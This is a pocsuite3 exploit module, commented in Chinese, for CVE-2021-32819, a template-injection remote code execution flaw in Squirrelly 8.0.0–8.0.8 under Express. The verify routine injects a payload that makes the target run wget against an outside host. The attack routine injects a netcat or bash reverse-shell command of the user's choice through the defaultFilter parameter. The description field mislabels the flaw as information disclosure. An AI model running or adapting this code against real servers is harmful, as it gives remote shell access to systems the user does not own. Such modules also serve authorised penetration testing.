from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = 'CVE-2021-32819'  # ssvid
    version = '1.0'
    name = 'Express Squirrelly 任意代码执行漏洞'
    appName = 'Squirrelly '
    appVersion = '8.0.0 ~ 8.0.8'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Squirrelly 存在信息泄露漏洞，该漏洞源于通过 Express 渲染API将纯模板数据与引擎配置选项混合，可以在下游触发远程代码执行漏洞。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://www.baidu.com%27);//"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "http" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self):#验证模式
        result = {}
        cmd = self.get_option("command")
        print(cmd)
        try:
            target = self.url+"/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27"+cmd+"%27);//"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 :
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)